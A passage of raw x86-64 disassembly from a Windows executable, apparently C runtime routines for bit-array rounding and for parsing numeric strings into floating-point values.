   14000dbc6:	41 d3 e1             	shl    %cl,%r9d
   14000dbc9:	4c 2b de             	sub    %rsi,%r11
   14000dbcc:	75 dc                	jne    0x14000dbaa
   14000dbce:	4d 63 d5             	movslq %r13d,%r10
   14000dbd1:	41 8d 7b 02          	lea    0x2(%r11),%edi
   14000dbd5:	45 8d 73 03          	lea    0x3(%r11),%r14d
   14000dbd9:	4d 8b ca             	mov    %r10,%r9
   14000dbdc:	44 8b c7             	mov    %edi,%r8d
   14000dbdf:	49 f7 d9             	neg    %r9
   14000dbe2:	4d 3b c2             	cmp    %r10,%r8
   14000dbe5:	7c 15                	jl     0x14000dbfc
   14000dbe7:	49 8b d0             	mov    %r8,%rdx
   14000dbea:	48 c1 e2 02          	shl    $0x2,%rdx
   14000dbee:	4a 8d 04 8a          	lea    (%rdx,%r9,4),%rax
   14000dbf2:	8b 4c 05 e8          	mov    -0x18(%rbp,%rax,1),%ecx
   14000dbf6:	89 4c 15 e8          	mov    %ecx,-0x18(%rbp,%rdx,1)
   14000dbfa:	eb 05                	jmp    0x14000dc01
   14000dbfc:	42 89 5c 85 e8       	mov    %ebx,-0x18(%rbp,%r8,4)
   14000dc01:	4c 2b c6             	sub    %rsi,%r8
   14000dc04:	79 dc                	jns    0x14000dbe2
   14000dc06:	44 8b 45 c8          	mov    -0x38(%rbp),%r8d
   14000dc0a:	45 8b dc             	mov    %r12d,%r11d
   14000dc0d:	41 8d 40 01          	lea    0x1(%r8),%eax
   14000dc11:	99                   	cltd
   14000dc12:	41 23 d4             	and    %r12d,%edx
   14000dc15:	03 c2                	add    %edx,%eax
   14000dc17:	44 8b c8             	mov    %eax,%r9d
   14000dc1a:	41 23 c4             	and    %r12d,%eax
   14000dc1d:	2b c2                	sub    %edx,%eax
   14000dc1f:	41 c1 f9 05          	sar    $0x5,%r9d
   14000dc23:	44 2b d8             	sub    %eax,%r11d
   14000dc26:	49 63 c1             	movslq %r9d,%rax
   14000dc29:	8b 4c 85 e8          	mov    -0x18(%rbp,%rax,4),%ecx
   14000dc2d:	44 0f a3 d9          	bt     %r11d,%ecx
   14000dc31:	0f 83 98 00 00 00    	jae    0x14000dccf
   14000dc37:	41 8b cb             	mov    %r11d,%ecx
   14000dc3a:	41 8b c7             	mov    %r15d,%eax
   14000dc3d:	49 63 d1             	movslq %r9d,%rdx
   14000dc40:	d3 e0                	shl    %cl,%eax
   14000dc42:	f7 d0                	not    %eax
   14000dc44:	85 44 95 e8          	test   %eax,-0x18(%rbp,%rdx,4)
   14000dc48:	75 19                	jne    0x14000dc63
   14000dc4a:	41 8d 41 01          	lea    0x1(%r9),%eax
   14000dc4e:	48 63 c8             	movslq %eax,%rcx
   14000dc51:	eb 09                	jmp    0x14000dc5c
   14000dc53:	39 5c 8d e8          	cmp    %ebx,-0x18(%rbp,%rcx,4)
   14000dc57:	75 0a                	jne    0x14000dc63
   14000dc59:	48 03 ce             	add    %rsi,%rcx
   14000dc5c:	49 3b ce             	cmp    %r14,%rcx
   14000dc5f:	7c f2                	jl     0x14000dc53
   14000dc61:	eb 6c                	jmp    0x14000dccf
   14000dc63:	41 8b c0             	mov    %r8d,%eax
   14000dc66:	41 8b cc             	mov    %r12d,%ecx
   14000dc69:	99                   	cltd
   14000dc6a:	41 23 d4             	and    %r12d,%edx
   14000dc6d:	03 c2                	add    %edx,%eax
   14000dc6f:	44 8b d0             	mov    %eax,%r10d
   14000dc72:	41 23 c4             	and    %r12d,%eax
   14000dc75:	2b c2                	sub    %edx,%eax
   14000dc77:	41 c1 fa 05          	sar    $0x5,%r10d
   14000dc7b:	8b d6                	mov    %esi,%edx
   14000dc7d:	2b c8                	sub    %eax,%ecx
   14000dc7f:	4d 63 ea             	movslq %r10d,%r13
   14000dc82:	42 8b 44 ad e8       	mov    -0x18(%rbp,%r13,4),%eax
   14000dc87:	d3 e2                	shl    %cl,%edx
   14000dc89:	8b cb                	mov    %ebx,%ecx
   14000dc8b:	44 8d 04 10          	lea    (%rax,%rdx,1),%r8d
   14000dc8f:	44 3b c0             	cmp    %eax,%r8d
   14000dc92:	72 05                	jb     0x14000dc99
   14000dc94:	44 3b c2             	cmp    %edx,%r8d
   14000dc97:	73 02                	jae    0x14000dc9b
   14000dc99:	8b ce                	mov    %esi,%ecx
   14000dc9b:	41 8d 42 ff          	lea    -0x1(%r10),%eax
   14000dc9f:	46 89 44 ad e8       	mov    %r8d,-0x18(%rbp,%r13,4)
   14000dca4:	48 63 d0             	movslq %eax,%rdx
   14000dca7:	85 c0                	test   %eax,%eax
   14000dca9:	78 24                	js     0x14000dccf
   14000dcab:	85 c9                	test   %ecx,%ecx
   14000dcad:	74 20                	je     0x14000dccf
   14000dcaf:	8b 44 95 e8          	mov    -0x18(%rbp,%rdx,4),%eax
   14000dcb3:	8b cb                	mov    %ebx,%ecx
   14000dcb5:	44 8d 40 01          	lea    0x1(%rax),%r8d
   14000dcb9:	44 3b c0             	cmp    %eax,%r8d
   14000dcbc:	72 05                	jb     0x14000dcc3
   14000dcbe:	44 3b c6             	cmp    %esi,%r8d
   14000dcc1:	73 02                	jae    0x14000dcc5
   14000dcc3:	8b ce                	mov    %esi,%ecx
   14000dcc5:	44 89 44 95 e8       	mov    %r8d,-0x18(%rbp,%rdx,4)
   14000dcca:	48 2b d6             	sub    %rsi,%rdx
   14000dccd:	79 dc                	jns    0x14000dcab
   14000dccf:	41 8b cb             	mov    %r11d,%ecx
   14000dcd2:	41 8b c7             	mov    %r15d,%eax
   14000dcd5:	d3 e0                	shl    %cl,%eax
   14000dcd7:	49 63 c9             	movslq %r9d,%rcx
   14000dcda:	21 44 8d e8          	and    %eax,-0x18(%rbp,%rcx,4)
   14000dcde:	41 8d 41 01          	lea    0x1(%r9),%eax
   14000dce2:	48 63 d0             	movslq %eax,%rdx
   14000dce5:	49 3b d6             	cmp    %r14,%rdx
   14000dce8:	7d 19                	jge    0x14000dd03
   14000dcea:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   14000dcee:	4d 8b c6             	mov    %r14,%r8
   14000dcf1:	4c 2b c2             	sub    %rdx,%r8
   14000dcf4:	48 8d 0c 91          	lea    (%rcx,%rdx,4),%rcx
   14000dcf8:	33 d2                	xor    %edx,%edx
   14000dcfa:	49 c1 e0 02          	shl    $0x2,%r8
   14000dcfe:	e8 9d 4a ff ff       	call   0x1400027a0
   14000dd03:	8b 05 d3 c6 00 00    	mov    0xc6d3(%rip),%eax        # 0x14001a3dc
   14000dd09:	41 bd 20 00 00 00    	mov    $0x20,%r13d
   14000dd0f:	44 8b cb             	mov    %ebx,%r9d
   14000dd12:	ff c0                	inc    %eax
   14000dd14:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   14000dd18:	99                   	cltd
   14000dd19:	41 23 d4             	and    %r12d,%edx
   14000dd1c:	03 c2                	add    %edx,%eax
   14000dd1e:	44 8b d0             	mov    %eax,%r10d
   14000dd21:	41 23 c4             	and    %r12d,%eax
   14000dd24:	2b c2                	sub    %edx,%eax
   14000dd26:	41 c1 fa 05          	sar    $0x5,%r10d
   14000dd2a:	8b c8                	mov    %eax,%ecx
   14000dd2c:	44 8b d8             	mov    %eax,%r11d
   14000dd2f:	41 d3 e7             	shl    %cl,%r15d
   14000dd32:	44 2b e8             	sub    %eax,%r13d
   14000dd35:	41 f7 d7             	not    %r15d
   14000dd38:	41 8b 00             	mov    (%r8),%eax
   14000dd3b:	41 8b cb             	mov    %r11d,%ecx
   14000dd3e:	8b d0                	mov    %eax,%edx
   14000dd40:	d3 e8                	shr    %cl,%eax
   14000dd42:	41 8b cd             	mov    %r13d,%ecx
   14000dd45:	41 0b c1             	or     %r9d,%eax
   14000dd48:	41 23 d7             	and    %r15d,%edx
   14000dd4b:	44 8b ca             	mov    %edx,%r9d
   14000dd4e:	41 89 00             	mov    %eax,(%r8)
   14000dd51:	4d 8d 40 04          	lea    0x4(%r8),%r8
   14000dd55:	41 d3 e1             	shl    %cl,%r9d
   14000dd58:	4c 2b f6             	sub    %rsi,%r14
   14000dd5b:	75 db                	jne    0x14000dd38
   14000dd5d:	4d 63 d2             	movslq %r10d,%r10
   14000dd60:	4c 8b c7             	mov    %rdi,%r8
   14000dd63:	4d 8b ca             	mov    %r10,%r9
   14000dd66:	49 f7 d9             	neg    %r9
   14000dd69:	4d 3b c2             	cmp    %r10,%r8
   14000dd6c:	7c 15                	jl     0x14000dd83
   14000dd6e:	49 8b d0             	mov    %r8,%rdx
   14000dd71:	48 c1 e2 02          	shl    $0x2,%rdx
   14000dd75:	4a 8d 04 8a          	lea    (%rdx,%r9,4),%rax
   14000dd79:	8b 4c 05 e8          	mov    -0x18(%rbp,%rax,1),%ecx
   14000dd7d:	89 4c 15 e8          	mov    %ecx,-0x18(%rbp,%rdx,1)
   14000dd81:	eb 05                	jmp    0x14000dd88
   14000dd83:	42 89 5c 85 e8       	mov    %ebx,-0x18(%rbp,%r8,4)
   14000dd88:	4c 2b c6             	sub    %rsi,%r8
   14000dd8b:	79 dc                	jns    0x14000dd69
   14000dd8d:	44 8b c3             	mov    %ebx,%r8d
   14000dd90:	8b df                	mov    %edi,%ebx
   14000dd92:	e9 1b 01 00 00       	jmp    0x14000deb2
   14000dd97:	8b 05 3f c6 00 00    	mov    0xc63f(%rip),%eax        # 0x14001a3dc
   14000dd9d:	44 8b 15 2c c6 00 00 	mov    0xc62c(%rip),%r10d        # 0x14001a3d0
   14000dda4:	41 bd 20 00 00 00    	mov    $0x20,%r13d
   14000ddaa:	99                   	cltd
   14000ddab:	41 23 d4             	and    %r12d,%edx
   14000ddae:	03 c2                	add    %edx,%eax
   14000ddb0:	44 8b d8             	mov    %eax,%r11d
   14000ddb3:	41 23 c4             	and    %r12d,%eax
   14000ddb6:	2b c2                	sub    %edx,%eax
   14000ddb8:	41 c1 fb 05          	sar    $0x5,%r11d
   14000ddbc:	8b c8                	mov    %eax,%ecx
   14000ddbe:	41 d3 e7             	shl    %cl,%r15d
   14000ddc1:	41 f7 d7             	not    %r15d
   14000ddc4:	41 3b fa             	cmp    %r10d,%edi
   14000ddc7:	7c 7a                	jl     0x14000de43
   14000ddc9:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   14000ddcd:	0f ba 6d e8 1f       	btsl   $0x1f,-0x18(%rbp)
   14000ddd2:	89 5d f0             	mov    %ebx,-0x10(%rbp)
   14000ddd5:	44 2b e8             	sub    %eax,%r13d
   14000ddd8:	8b f8                	mov    %eax,%edi
   14000ddda:	44 8b cb             	mov    %ebx,%r9d
   14000dddd:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   14000dde1:	41 8b 00             	mov    (%r8),%eax
   14000dde4:	8b cf                	mov    %edi,%ecx
   14000dde6:	41 8b d7             	mov    %r15d,%edx
   14000dde9:	23 d0                	and    %eax,%edx
   14000ddeb:	d3 e8                	shr    %cl,%eax
   14000dded:	41 8b cd             	mov    %r13d,%ecx
   14000ddf0:	41 0b c1             	or     %r9d,%eax
   14000ddf3:	44 8b ca             	mov    %edx,%r9d
   14000ddf6:	41 d3 e1             	shl    %cl,%r9d
   14000ddf9:	41 89 00             	mov    %eax,(%r8)
   14000ddfc:	4d 8d 40 04          	lea    0x4(%r8),%r8
   14000de00:	4c 2b f6             	sub    %rsi,%r14
   14000de03:	75 dc                	jne    0x14000dde1
   14000de05:	4d 63 cb             	movslq %r11d,%r9
   14000de08:	41 8d 7e 02          	lea    0x2(%r14),%edi
   14000de0c:	4d 8b c1             	mov    %r9,%r8
   14000de0f:	49 f7 d8             	neg    %r8
   14000de12:	49 3b f9             	cmp    %r9,%rdi
   14000de15:	7c 15                	jl     0x14000de2c
   14000de17:	48 8b d7             	mov    %rdi,%rdx
   14000de1a:	48 c1 e2 02          	shl    $0x2,%rdx
   14000de1e:	4a 8d 04 82          	lea    (%rdx,%r8,4),%rax
   14000de22:	8b 4c 05 e8          	mov    -0x18(%rbp,%rax,1),%ecx
   14000de26:	89 4c 15 e8          	mov    %ecx,-0x18(%rbp,%rdx,1)
   14000de2a:	eb 04                	jmp    0x14000de30
   14000de2c:	89 5c bd e8          	mov    %ebx,-0x18(%rbp,%rdi,4)
   14000de30:	48 2b fe             	sub    %rsi,%rdi
   14000de33:	79 dd                	jns    0x14000de12
   14000de35:	44 8b 05 a8 c5 00 00 	mov    0xc5a8(%rip),%r8d        # 0x14001a3e4
   14000de3c:	8b de                	mov    %esi,%ebx
   14000de3e:	45 03 c2             	add    %r10d,%r8d
   14000de41:	eb 6f                	jmp    0x14000deb2
   14000de43:	44 8b 05 9a c5 00 00 	mov    0xc59a(%rip),%r8d        # 0x14001a3e4
   14000de4a:	0f ba 75 e8 1f       	btrl   $0x1f,-0x18(%rbp)
   14000de4f:	44 8b d3             	mov    %ebx,%r10d
   14000de52:	44 03 c7             	add    %edi,%r8d
   14000de55:	8b f8                	mov    %eax,%edi
   14000de57:	44 2b e8             	sub    %eax,%r13d
   14000de5a:	4c 8d 4d e8          	lea    -0x18(%rbp),%r9
   14000de5e:	41 8b 01             	mov    (%r9),%eax
   14000de61:	8b cf                	mov    %edi,%ecx
   14000de63:	8b d0                	mov    %eax,%edx
   14000de65:	d3 e8                	shr    %cl,%eax
   14000de67:	41 8b cd             	mov    %r13d,%ecx
   14000de6a:	41 0b c2             	or     %r10d,%eax
   14000de6d:	41 23 d7             	and    %r15d,%edx
   14000de70:	44 8b d2             	mov    %edx,%r10d
   14000de73:	41 89 01             	mov    %eax,(%r9)
   14000de76:	4d 8d 49 04          	lea    0x4(%r9),%r9
   14000de7a:	41 d3 e2             	shl    %cl,%r10d
   14000de7d:	4c 2b f6             	sub    %rsi,%r14
   14000de80:	75 dc                	jne    0x14000de5e
   14000de82:	4d 63 d3             	movslq %r11d,%r10
   14000de85:	41 8d 7e 02          	lea    0x2(%r14),%edi
   14000de89:	4d 8b ca             	mov    %r10,%r9
   14000de8c:	49 f7 d9             	neg    %r9
   14000de8f:	49 3b fa             	cmp    %r10,%rdi
   14000de92:	7c 15                	jl     0x14000dea9
   14000de94:	48 8b d7             	mov    %rdi,%rdx
   14000de97:	48 c1 e2 02          	shl    $0x2,%rdx
   14000de9b:	4a 8d 04 8a          	lea    (%rdx,%r9,4),%rax
   14000de9f:	8b 4c 05 e8          	mov    -0x18(%rbp,%rax,1),%ecx
   14000dea3:	89 4c 15 e8          	mov    %ecx,-0x18(%rbp,%rdx,1)
   14000dea7:	eb 04                	jmp    0x14000dead
   14000dea9:	89 5c bd e8          	mov    %ebx,-0x18(%rbp,%rdi,4)
   14000dead:	48 2b fe             	sub    %rsi,%rdi
   14000deb0:	79 dd                	jns    0x14000de8f
   14000deb2:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
   14000deb6:	44 2b 25 1f c5 00 00 	sub    0xc51f(%rip),%r12d        # 0x14001a3dc
   14000debd:	41 8a cc             	mov    %r12b,%cl
   14000dec0:	41 d3 e0             	shl    %cl,%r8d
   14000dec3:	f7 5d c4             	negl   -0x3c(%rbp)
   14000dec6:	1b c0                	sbb    %eax,%eax
   14000dec8:	25 00 00 00 80       	and    $0x80000000,%eax
   14000decd:	44 0b c0             	or     %eax,%r8d
   14000ded0:	8b 05 0a c5 00 00    	mov    0xc50a(%rip),%eax        # 0x14001a3e0
   14000ded6:	44 0b 45 e8          	or     -0x18(%rbp),%r8d
   14000deda:	83 f8 40             	cmp    $0x40,%eax
   14000dedd:	75 0b                	jne    0x14000deea
   14000dedf:	8b 45 ec             	mov    -0x14(%rbp),%eax
   14000dee2:	44 89 42 04          	mov    %r8d,0x4(%rdx)
   14000dee6:	89 02                	mov    %eax,(%rdx)
   14000dee8:	eb 08                	jmp    0x14000def2
   14000deea:	83 f8 20             	cmp    $0x20,%eax
   14000deed:	75 03                	jne    0x14000def2
   14000deef:	44 89 02             	mov    %r8d,(%rdx)
   14000def2:	8b c3                	mov    %ebx,%eax
   14000def4:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   14000def8:	48 33 cc             	xor    %rsp,%rcx
   14000defb:	e8 40 53 ff ff       	call   0x140003240
   14000df00:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   14000df05:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000df09:	49 8b 73 40          	mov    0x40(%r11),%rsi
   14000df0d:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   14000df11:	49 8b e3             	mov    %r11,%rsp
   14000df14:	41 5f                	pop    %r15
   14000df16:	41 5e                	pop    %r14
   14000df18:	41 5d                	pop    %r13
   14000df1a:	41 5c                	pop    %r12
   14000df1c:	5d                   	pop    %rbp
   14000df1d:	c3                   	ret
   14000df1e:	cc                   	int3
   14000df1f:	cc                   	int3
   14000df20:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000df25:	55                   	push   %rbp
   14000df26:	56                   	push   %rsi
   14000df27:	57                   	push   %rdi
   14000df28:	41 54                	push   %r12
   14000df2a:	41 55                	push   %r13
   14000df2c:	41 56                	push   %r14
   14000df2e:	41 57                	push   %r15
   14000df30:	48 8d 6c 24 f9       	lea    -0x7(%rsp),%rbp
   14000df35:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   14000df3c:	48 8b 05 bd b0 00 00 	mov    0xb0bd(%rip),%rax        # 0x140019000
   14000df43:	48 33 c4             	xor    %rsp,%rax
   14000df46:	48 89 45 ff          	mov    %rax,-0x1(%rbp)
   14000df4a:	4c 8b 75 7f          	mov    0x7f(%rbp),%r14
   14000df4e:	33 db                	xor    %ebx,%ebx
   14000df50:	44 89 4d 93          	mov    %r9d,-0x6d(%rbp)
   14000df54:	44 8d 4b 01          	lea    0x1(%rbx),%r9d
   14000df58:	48 89 4d a7          	mov    %rcx,-0x59(%rbp)
   14000df5c:	48 89 55 97          	mov    %rdx,-0x69(%rbp)
   14000df60:	4c 8d 55 df          	lea    -0x21(%rbp),%r10
   14000df64:	66 89 5d 8f          	mov    %bx,-0x71(%rbp)
   14000df68:	44 8b db             	mov    %ebx,%r11d
   14000df6b:	44 89 4d 8b          	mov    %r9d,-0x75(%rbp)
   14000df6f:	44 8b fb             	mov    %ebx,%r15d
   14000df72:	89 5d 87             	mov    %ebx,-0x79(%rbp)
   14000df75:	44 8b e3             	mov    %ebx,%r12d
   14000df78:	44 8b eb             	mov    %ebx,%r13d
   14000df7b:	8b f3                	mov    %ebx,%esi
   14000df7d:	8b cb                	mov    %ebx,%ecx
   14000df7f:	4d 85 f6             	test   %r14,%r14
   14000df82:	75 17                	jne    0x14000df9b
   14000df84:	e8 ef 65 ff ff       	call   0x140004578
   14000df89:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000df8f:	e8 94 61 ff ff       	call   0x140004128
   14000df94:	33 c0                	xor    %eax,%eax
   14000df96:	e9 bf 07 00 00       	jmp    0x14000e75a
   14000df9b:	49 8b f8             	mov    %r8,%rdi
   14000df9e:	41 80 38 20          	cmpb   $0x20,(%r8)
   14000dfa2:	77 19                	ja     0x14000dfbd
   14000dfa4:	49 0f be 00          	movsbq (%r8),%rax
   14000dfa8:	48 ba 00 26 00 00 01 	movabs $0x100002600,%rdx
   14000dfaf:	00 00 00 
   14000dfb2:	48 0f a3 c2          	bt     %rax,%rdx
   14000dfb6:	73 05                	jae    0x14000dfbd
   14000dfb8:	4d 03 c1             	add    %r9,%r8
   14000dfbb:	eb e1                	jmp    0x14000df9e
   14000dfbd:	41 8a 10             	mov    (%r8),%dl
   14000dfc0:	4d 03 c1             	add    %r9,%r8
   14000dfc3:	83 f9 05             	cmp    $0x5,%ecx
   14000dfc6:	0f 8f 0a 02 00 00    	jg     0x14000e1d6
   14000dfcc:	0f 84 ea 01 00 00    	je     0x14000e1bc
   14000dfd2:	44 8b c9             	mov    %ecx,%r9d
   14000dfd5:	85 c9                	test   %ecx,%ecx
   14000dfd7:	0f 84 83 01 00 00    	je     0x14000e160
   14000dfdd:	41 ff c9             	dec    %r9d
   14000dfe0:	0f 84 3a 01 00 00    	je     0x14000e120
   14000dfe6:	41 ff c9             	dec    %r9d
   14000dfe9:	0f 84 df 00 00 00    	je     0x14000e0ce
   14000dfef:	41 ff c9             	dec    %r9d
   14000dff2:	0f 84 89 00 00 00    	je     0x14000e081
   14000dff8:	41 ff c9             	dec    %r9d
   14000dffb:	0f 85 9a 02 00 00    	jne    0x14000e29b
   14000e001:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000e007:	b0 30                	mov    $0x30,%al
   14000e009:	45 8b f9             	mov    %r9d,%r15d
   14000e00c:	44 89 4d 87          	mov    %r9d,-0x79(%rbp)
   14000e010:	45 85 db             	test   %r11d,%r11d
   14000e013:	75 30                	jne    0x14000e045
   14000e015:	eb 09                	jmp    0x14000e020
   14000e017:	41 8a 10             	mov    (%r8),%dl
   14000e01a:	41 2b f1             	sub    %r9d,%esi
   14000e01d:	4d 03 c1             	add    %r9,%r8
   14000e020:	3a d0                	cmp    %al,%dl
   14000e022:	74 f3                	je     0x14000e017
   14000e024:	eb 1f                	jmp    0x14000e045
   14000e026:	80 fa 39             	cmp    $0x39,%dl
   14000e029:	7f 1e                	jg     0x14000e049
   14000e02b:	41 83 fb 19          	cmp    $0x19,%r11d
   14000e02f:	73 0e                	jae    0x14000e03f
   14000e031:	2a d0                	sub    %al,%dl
   14000e033:	45 03 d9             	add    %r9d,%r11d
   14000e036:	41 88 12             	mov    %dl,(%r10)
   14000e039:	4d 03 d1             	add    %r9,%r10
   14000e03c:	41 2b f1             	sub    %r9d,%esi
   14000e03f:	41 8a 10             	mov    (%r8),%dl
   14000e042:	4d 03 c1             	add    %r9,%r8
   14000e045:	3a d0                	cmp    %al,%dl
   14000e047:	7d dd                	jge    0x14000e026
   14000e049:	8d 42 d5             	lea    -0x2b(%rdx),%eax
   14000e04c:	a8 fd                	test   $0xfd,%al
   14000e04e:	74 24                	je     0x14000e074
   14000e050:	80 fa 43             	cmp    $0x43,%dl
   14000e053:	0f 8e 3c 01 00 00    	jle    0x14000e195
   14000e059:	80 fa 45             	cmp    $0x45,%dl
   14000e05c:	7e 0c                	jle    0x14000e06a
   14000e05e:	80 ea 64             	sub    $0x64,%dl
   14000e061:	41 3a d1             	cmp    %r9b,%dl
   14000e064:	0f 87 2b 01 00 00    	ja     0x14000e195
   14000e06a:	b9 06 00 00 00       	mov    $0x6,%ecx
   14000e06f:	e9 49 ff ff ff       	jmp    0x14000dfbd
   14000e074:	4d 2b c1             	sub    %r9,%r8
   14000e077:	b9 0b 00 00 00       	mov    $0xb,%ecx
   14000e07c:	e9 3c ff ff ff       	jmp    0x14000dfbd
   14000e081:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000e087:	b0 30                	mov    $0x30,%al
   14000e089:	45 8b f9             	mov    %r9d,%r15d
   14000e08c:	eb 21                	jmp    0x14000e0af
   14000e08e:	80 fa 39             	cmp    $0x39,%dl
   14000e091:	7f 20                	jg     0x14000e0b3
   14000e093:	41 83 fb 19          	cmp    $0x19,%r11d
   14000e097:	73 0d                	jae    0x14000e0a6
   14000e099:	2a d0                	sub    %al,%dl
   14000e09b:	45 03 d9             	add    %r9d,%r11d
   14000e09e:	41 88 12             	mov    %dl,(%r10)
   14000e0a1:	4d 03 d1             	add    %r9,%r10
   14000e0a4:	eb 03                	jmp    0x14000e0a9
   14000e0a6:	41 03 f1             	add    %r9d,%esi
   14000e0a9:	41 8a 10             	mov    (%r8),%dl
   14000e0ac:	4d 03 c1             	add    %r9,%r8
   14000e0af:	3a d0                	cmp    %al,%dl
   14000e0b1:	7d db                	jge    0x14000e08e
   14000e0b3:	49 8b 06             	mov    (%r14),%rax
   14000e0b6:	48 8b 88 f0 00 00 00 	mov    0xf0(%rax),%rcx
   14000e0bd:	48 8b 01             	mov    (%rcx),%rax
   14000e0c0:	3a 10                	cmp    (%rax),%dl
   14000e0c2:	75 85                	jne    0x14000e049
   14000e0c4:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000e0c9:	e9 ef fe ff ff       	jmp    0x14000dfbd
   14000e0ce:	8d 42 cf             	lea    -0x31(%rdx),%eax
   14000e0d1:	3c 08                	cmp    $0x8,%al
   14000e0d3:	77 13                	ja     0x14000e0e8
   14000e0d5:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000e0da:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000e0e0:	4d 2b c1             	sub    %r9,%r8
   14000e0e3:	e9 d5 fe ff ff       	jmp    0x14000dfbd
   14000e0e8:	49 8b 06             	mov    (%r14),%rax
   14000e0eb:	48 8b 88 f0 00 00 00 	mov    0xf0(%rax),%rcx
   14000e0f2:	48 8b 01             	mov    (%rcx),%rax
   14000e0f5:	3a 10                	cmp    (%rax),%dl
   14000e0f7:	75 10                	jne    0x14000e109
   14000e0f9:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000e0fe:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000e104:	e9 b4 fe ff ff       	jmp    0x14000dfbd
   14000e109:	80 fa 30             	cmp    $0x30,%dl
   14000e10c:	0f 85 f2 01 00 00    	jne    0x14000e304
   14000e112:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000e118:	41 8b c9             	mov    %r9d,%ecx
   14000e11b:	e9 9d fe ff ff       	jmp    0x14000dfbd
   14000e120:	8d 42 cf             	lea    -0x31(%rdx),%eax
   14000e123:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000e129:	45 8b f9             	mov    %r9d,%r15d
   14000e12c:	3c 08                	cmp    $0x8,%al
   14000e12e:	77 06                	ja     0x14000e136
   14000e130:	41 8d 49 02          	lea    0x2(%r9),%ecx
   14000e134:	eb aa                	jmp    0x14000e0e0
   14000e136:	49 8b 06             	mov    (%r14),%rax
   14000e139:	48 8b 88 f0 00 00 00 	mov    0xf0(%rax),%rcx
   14000e140:	48 8b 01             	mov    (%rcx),%rax
   14000e143:	3a 10                	cmp    (%rax),%dl
   14000e145:	0f 84 79 ff ff ff    	je     0x14000e0c4
   14000e14b:	8d 42 d5             	lea    -0x2b(%rdx),%eax
   14000e14e:	a8 fd                	test   $0xfd,%al
   14000e150:	0f 84 1e ff ff ff    	je     0x14000e074
   14000e156:	80 fa 30             	cmp    $0x30,%dl
   14000e159:	74 bd                	je     0x14000e118
   14000e15b:	e9 f0 fe ff ff       	jmp    0x14000e050
   14000e160:	8d 42 cf             	lea    -0x31(%rdx),%eax
   14000e163:	3c 08                	cmp    $0x8,%al
   14000e165:	0f 86 6a ff ff ff    	jbe    0x14000e0d5
   14000e16b:	49 8b 06             	mov    (%r14),%rax
   14000e16e:	48 8b 88 f0 00 00 00 	mov    0xf0(%rax),%rcx
   14000e175:	48 8b 01             	mov    (%rcx),%rax
   14000e178:	3a 10                	cmp    (%rax),%dl
   14000e17a:	0f 84 79 ff ff ff    	je     0x14000e0f9
   14000e180:	80 fa 2b             	cmp    $0x2b,%dl
   14000e183:	74 29                	je     0x14000e1ae
   14000e185:	80 fa 2d             	cmp    $0x2d,%dl
   14000e188:	74 13                	je     0x14000e19d
   14000e18a:	80 fa 30             	cmp    $0x30,%dl
   14000e18d:	74 83                	je     0x14000e112
   14000e18f:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000e195:	4d 2b c1             	sub    %r9,%r8
   14000e198:	e9 70 01 00 00       	jmp    0x14000e30d
   14000e19d:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000e1a2:	c7 45 8f 00 80 00 00 	movl   $0x8000,-0x71(%rbp)
   14000e1a9:	e9 50 ff ff ff       	jmp    0x14000e0fe
   14000e1ae:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000e1b3:	66 89 5d 8f          	mov    %bx,-0x71(%rbp)
   14000e1b7:	e9 42 ff ff ff       	jmp    0x14000e0fe
   14000e1bc:	80 ea 30             	sub    $0x30,%dl
   14000e1bf:	44 89 4d 87          	mov    %r9d,-0x79(%rbp)
   14000e1c3:	80 fa 09             	cmp    $0x9,%dl
   14000e1c6:	0f 87 d9 00 00 00    	ja     0x14000e2a5
   14000e1cc:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000e1d1:	e9 0a ff ff ff       	jmp    0x14000e0e0
   14000e1d6:	44 8b c9             	mov    %ecx,%r9d
   14000e1d9:	41 83 e9 06          	sub    $0x6,%r9d
   14000e1dd:	0f 84 9c 00 00 00    	je     0x14000e27f
   14000e1e3:	41 ff c9             	dec    %r9d
   14000e1e6:	74 73                	je     0x14000e25b
   14000e1e8:	41 ff c9             	dec    %r9d
   14000e1eb:	74 42                	je     0x14000e22f
   14000e1ed:	41 ff c9             	dec    %r9d
   14000e1f0:	0f 84 b4 00 00 00    	je     0x14000e2aa
   14000e1f6:	41 83 f9 02          	cmp    $0x2,%r9d
   14000e1fa:	0f 85 9b 00 00 00    	jne    0x14000e29b
   14000e200:	39 5d 77             	cmp    %ebx,0x77(%rbp)
   14000e203:	74 8a                	je     0x14000e18f
   14000e205:	49 8d 78 ff          	lea    -0x1(%r8),%rdi
   14000e209:	80 fa 2b             	cmp    $0x2b,%dl
   14000e20c:	74 17                	je     0x14000e225
   14000e20e:	80 fa 2d             	cmp    $0x2d,%dl
   14000e211:	0f 85 ed 00 00 00    	jne    0x14000e304
   14000e217:	83 4d 8b ff          	orl    $0xffffffff,-0x75(%rbp)
   14000e21b:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000e220:	e9 d9 fe ff ff       	jmp    0x14000e0fe
   14000e225:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000e22a:	e9 cf fe ff ff       	jmp    0x14000e0fe
   14000e22f:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000e235:	45 8b e1             	mov    %r9d,%r12d
   14000e238:	eb 06                	jmp    0x14000e240
